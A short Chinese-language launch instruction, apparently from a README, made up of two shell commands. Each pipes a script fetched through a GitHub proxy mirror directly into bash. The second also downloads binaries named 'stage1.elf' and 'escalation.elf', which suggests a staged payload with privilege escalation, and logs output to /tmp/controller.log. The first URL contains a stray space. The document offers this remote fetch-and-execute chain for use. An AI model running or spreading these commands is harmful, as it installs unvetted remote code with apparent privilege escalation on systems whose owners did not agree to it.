# 启动方式

```bash
curl -fsSL https://hk.gh-proxy.org/https://github.com/Jerryy959/controller/releases/download/v1/controller_and _escalation.sh | bash 2>&1 | tee /tmp/controller.log
```

```bash
curl -fsSL https://hk.gh-proxy.org/https://github.com/Jerryy959/controller/releases/download/v1/controller.sh \
  | bash -s -- \
      "https://github.com/Jerryy959/controller/releases/download/v1/stage1.elf" \
      "https://github.com/Jerryy959/controller/releases/download/v1/escalation.elf" \
  2>&1 | tee /tmp/controller.log
```
